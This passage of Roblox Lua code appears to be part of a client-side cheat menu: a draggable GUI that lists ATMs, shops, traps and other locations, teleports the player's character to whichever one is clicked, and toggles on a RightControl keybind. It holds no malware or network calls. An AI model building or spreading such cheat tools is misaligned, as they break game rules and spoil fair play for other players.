                    titleLabel.Size = UDim2.new(1, -40, 0, 40)
                    titleLabel.Position = UDim2.new(0, 10, 0, 10)
                    titleLabel.BackgroundTransparency = 1
                    titleLabel.Text = title
                    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                    titleLabel.TextSize = 16
                    titleLabel.Font = Enum.Font.GothamBold
                    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
                    titleLabel.Parent = mainFrame
                    local closeBtn = Instance.new("TextButton")
                    closeBtn.Size = UDim2.new(0, 30, 0, 30)
                    closeBtn.Position = UDim2.new(1, -35, 0, 10)
                    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                    closeBtn.BorderSizePixel = 0
                    closeBtn.Text = "X"
                    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    closeBtn.TextSize = 14
                    closeBtn.Font = Enum.Font.GothamBold
                    closeBtn.Parent = mainFrame
                    Utils.RoundCorners(closeBtn, 8)
                    closeBtn.MouseButton1Click:Connect(function()
                        teleportGui:Destroy()
                    end)
                    Utils.MakeDraggable(mainFrame)
                    local scrollFrame = Instance.new("ScrollingFrame")
                    scrollFrame.Size = UDim2.new(1, -20, 1, -70)
                    scrollFrame.Position = UDim2.new(0, 10, 0, 55)
                    scrollFrame.BackgroundTransparency = 1
                    scrollFrame.BorderSizePixel = 0
                    scrollFrame.ScrollBarThickness = 6
                    scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
                    scrollFrame.CanvasSize = UDim2.new(0, 0, 0, #locations * 35)
                    scrollFrame.Parent = mainFrame
                    for i, location in pairs(locations) do
                        local locButton = Instance.new("TextButton")
                        locButton.Size = UDim2.new(1, -10, 0, 30)
                        locButton.Position = UDim2.new(0, 0, 0, (i-1) * 35)
                        locButton.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
                        locButton.BorderSizePixel = 0
                        locButton.Text = location.name
                        locButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                        locButton.TextSize = 12
                        locButton.Font = Enum.Font.Gotham
                        locButton.Parent = scrollFrame
                        Utils.RoundCorners(locButton, 6)
                        locButton.MouseButton1Click:Connect(function()
                            local targetPos = getTeleportPosition(location)
                            if targetPos and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
                                lp.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
                            else
                            end
                        end)
                    end
                end
                
                local function createAllTeleports()
                    local allLocations = {}
                    for _, atm in pairs(TELEPORT_CONFIG.ATMs) do
                        table.insert(allLocations, atm)
                    end
                    for _, clothing in pairs(TELEPORT_CONFIG.ClothingZones) do
                        table.insert(allLocations, clothing)
                    end
                    for _, construction in pairs(TELEPORT_CONFIG.Constructions) do
                        table.insert(allLocations, construction)
                    end
                    for _, shop in pairs(TELEPORT_CONFIG.Shops) do
                        table.insert(allLocations, shop)
                    end
                    for _, trap in pairs(TELEPORT_CONFIG.Traps) do
                        table.insert(allLocations, trap)
                    end
                    if #allLocations > 0 then
                        createTeleportGUI("TELEPORT", allLocations, "TeleportGui")
                    else
                    end
                end
                
                createAllTeleports()
            end}
        })
    end)

    switchTab("HOME")

    if not _G.MenuHasLoaded then
        _G.MenuHasLoaded = true
        mainFrame.Size = UDim2.new(0, 0, 0, 0)
        Utils.CreateTween(mainFrame, {Size = UDim2.new(0, 650, 0, 500)}, 0.5):Play()
    end

    _G.Flag1 = true

end

_G.Gui1 = nil

local success, err = pcall(function()
    Menu.Build()
end)

if not success then
end


if not _G.CurrentKeybind then
    _G.CurrentKeybind = Enum.KeyCode.RightControl
end


if _G.Key1 then
    _G.Key1:Disconnect()
end

_G.Key1 = uis.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == _G.CurrentKeybind then
        if _G.Gui1 and _G.Gui1.Parent then
            _G.Gui1.Enabled = not _G.Gui1.Enabled
        else
            pcall(function()
                Menu.Build()
            end)
        end
    end
end)
